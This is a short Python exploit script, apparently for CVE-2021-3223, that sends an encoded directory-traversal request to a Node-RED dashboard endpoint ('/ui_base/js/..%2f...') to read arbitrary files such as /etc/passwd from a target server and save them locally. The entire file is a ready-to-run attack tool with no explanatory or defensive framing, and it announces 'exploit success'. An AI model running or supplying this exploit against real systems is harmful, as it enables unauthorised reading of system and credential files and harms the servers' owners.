import requests
import sys

if len(sys.argv) < 4:
    print("Usage:")
    print("	python CVE-2021-3223.py http://your-ip:1880 /etc/passwd outputfile")
    exit(0)

url = sys.argv[1]
files = sys.argv[2]
out = sys.argv[3]

files = files.replace("/","%2f")
req = requests.get(url+"/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f.."+files)
if req.status_code == 200:
    print("[+] exploit success")
    with open(out,'w+') as f:
        f.write(req.content)
        f.close()
        print("[+] output file "+out)
